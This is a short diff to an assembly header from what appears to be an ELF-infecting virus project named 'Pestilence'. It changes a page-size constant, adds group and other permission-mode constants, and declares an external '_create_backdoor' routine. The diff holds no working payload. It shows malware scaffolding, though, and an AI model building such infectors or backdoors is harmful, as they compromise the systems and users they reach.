@@ -4,7 +4,7 @@
 	%define PESTILENCE
 
 ; Syscall numbers
-	%define PAGE_SIZE 8192
+	%define PAGE_SIZE 16384
 	%define SYS_READ 0
 	%define SYS_WRITE 1
 	%define SYS_OPEN 2
@@ -32,6 +32,8 @@
 
 ; Open mode
 	%define S_IRWXU 448
+	%define S_IRWXG 56
+	%define S_IRWXO 7
 	%define S_IRGRP 32
 	%define S_IROTH 4
 	%define S_IXGRP 8
@@ -166,5 +168,9 @@
 
 	%ifndef CRC32_S
 		extern _crc32
+	%endif
+
+	%ifndef CREATE_BACKDOOR_S
+		extern _create_backdoor
 	%endif
 %endif
